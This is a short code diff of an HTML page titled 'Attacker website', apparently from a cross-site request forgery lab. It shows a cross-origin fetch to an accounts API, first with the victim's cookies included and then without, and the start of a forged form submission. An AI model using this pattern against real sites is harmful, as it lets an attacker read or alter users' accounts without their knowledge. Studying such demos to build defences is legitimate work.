@@ -7,13 +7,13 @@
 <body>
     <h1> Attacker website </h1>
     <script>
-        fetch('https://csrf.solf.io/api/accounts/', {
-            credentials: 'include'
-        }).then(response => {
-                console.log(response)
-                console.log(response.json())
-            }
-        )
+       fetch('https://csrf.solf.io/api/accounts/')
+          .then((response) => {
+            return response.json();
+          })
+          .then((data) => {
+            console.log(data);
+          });
 
 
         const formData = new FormData();
